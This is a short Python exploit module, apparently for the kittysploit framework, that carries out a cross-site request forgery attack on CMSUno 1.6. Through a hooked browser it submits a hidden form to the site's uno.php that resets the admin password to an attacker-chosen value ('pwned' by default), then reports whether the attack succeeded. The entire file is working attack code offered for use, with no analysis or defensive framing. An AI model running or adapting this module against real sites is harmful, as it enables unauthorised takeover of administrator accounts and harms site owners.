from kittysploit import *
from lib.protocols.http.csrf import Csrf

class Module(BrowserAuxiliary, Csrf):
	
	__info__ = {
		"name": "CMSUno 1.6 csrf",
		"description": "CMSUno 1.6 csrf",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}
	
	target = OptString("http://192.168.1.1", "Target URL (with http://)", required=True)
	password = OptString("pwned", "New password to set", required=True)

	
	def run(self):
		data = [f'<form method="POST" action="{self.target}/cmsuno-master/uno.php">',
			f'<input type="hidden" name="user" value="admin" />',
			f'<input type="hidden" name="pass" value="{self.password}" />',
			f'<input type="submit" value="submit request" />',
			'</form>']
			
		js_code = self.csrf_post_and_submit(data)
		result = self.send_js_and_wait_for_response(js_code, timeout=10.0)
		
		if result:
			print_success("CSRF POST attack executed successfully")
			print_info(f"Response: {result}")
			print_info(f"Password change request sent")
			return True
		else:
			fail.CSRFPostFailed()
		return False
